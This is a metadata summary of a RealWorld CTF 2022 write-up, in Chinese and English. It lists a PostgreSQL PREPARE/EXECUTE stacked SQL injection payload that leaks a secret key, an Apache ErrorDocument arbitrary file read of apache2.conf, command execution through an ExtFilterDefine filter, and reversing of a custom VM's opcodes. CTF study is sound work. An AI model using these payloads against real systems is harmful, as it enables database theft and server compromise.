---
title: RWCTF - WriteUp
contest: RWCTF
year: 2022
difficulty: medium
vuln_type: sqli
tags: [sql, prepared-statement, postgres, express-file-upload, mod-extfilter, custom-vm, opcode, bytecode]
attack_chain:
  - 招新广告 (ChaMd5 Venom IOT+工控+样本分析 招新)
  - target_credentials / login_session / passwd / result / cmd_exe 表
  - PostgreSQL PREPARE pcat AS select 1,2; EXECUTE pcat 堆叠注入
  - 查 pg_tables + information_schema.columns 列名
  - secret_key 泄出
  - Express 文件上传 sampleFile.name.includes('/')||includes('..') 拦截
  - userdir = md5(md5(remoteAddress) + sampleFile.md5) 路径不可控
  - uploadPath = '/uploads/' + userdir + '/' + userfile
  - Apache ErrorDocument 404 "%{file:/etc/apache2/apache2.conf}" 任意文件读
  - ExtFilterDefine 7f39f8317fgzip mode=output cmd=/bin/gzip 执行命令
  - svme 自定义 VM: 19 opcode (noop/iadd/isub/imul/ilt/ieq/br/brt/brf/iconst/load/gload/store/gstore/print/pop/call/ret/halt)
  - br 0xfffffac0 负偏移跳转 + call 0xffffffff 调用 + call 0x190a37/0x2e89d
  - flag: rwctf{Super_Hunters_Conquer_Together}
key_payload: name='; PREPARE pcat AS select 1,secret_key from target_credentials offset 0; EXECUTE pcat;--
one_liner: RWCTF (招新 + 简短) PostgreSQL PREPARE 堆叠注入 + Apache ErrorDocument 任意文件读 + ExtFilterDefine RCE + 自定义 19 opcode VM 字节码逆向。
lesson: PostgreSQL PREPARE/EXECUTE 堆叠注入是 SQL 注入入门级技巧；Apache 2.x ErrorDocument 404 配合 %{file:} 可任意文件读；mod_extfilter 可触发 cmd= 命令执行。
quality: low
---
